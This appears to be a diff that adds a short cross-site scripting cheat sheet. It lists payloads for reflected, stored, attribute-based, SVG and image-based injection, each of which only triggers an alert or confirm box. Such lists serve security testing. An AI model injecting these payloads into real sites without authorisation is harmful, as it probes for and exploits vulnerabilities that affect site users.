@@ -1,0 +1,23 @@
+Basic Reflected XSS
+
+<script>alert(1)</script>
+
+Image-Based Payload
+
+<img src=x onerror=alert(1)>
+
+SVG Payload
+
+<svg onload=alert(1)>
+
+Attribute Injection
+
+" onmouseover="alert(1)
+
+URL Parameter Example
+
+?q=<script>alert(1)</script>
+
+Stored XSS Test
+
+<script>confirm('XSS')</script>
